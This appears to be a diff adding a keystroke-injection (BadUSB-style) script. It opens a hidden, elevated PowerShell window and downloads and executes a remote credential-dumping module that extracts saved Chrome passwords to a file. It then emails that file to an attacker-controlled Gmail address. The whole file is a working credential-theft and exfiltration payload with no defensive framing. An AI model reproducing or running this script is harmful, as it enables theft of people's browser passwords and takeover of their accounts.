@@ -1,0 +1,9 @@
+Press:131+114
+DELAY
+Print:powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
+Press:176
+Press:130+121
+Print:powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'); Get-ChromeDump -OutFile "C:\chromepwds.txt" 
+Press:176
+Print:powershell -c "$msg = new-object Net.Mail.MailMessage; $smtp = new-object Net.Mail.SmtpClient('smtp.gmail.com'); $smtp.EnableSsl = $true; $msg.From = 'XXXXX@gmail.com'; $msg.To.Add('xxxxx@gmail.com'); $msg.SubjectEncoding = [system.Text.Encoding]::Unicode; $msg.Subject = 'Test mail from PS'; $msg.Body = 'Test mail from PS '; $msg.Attachments.Add('c:\\\\chromepwds.txt'); $smtp.Credentials = New-Object System.Net.NetworkCredential('XXXXXX@gmail.com', 'XXXXXX');$smtp.Send($msg)" & exit
+Press:176
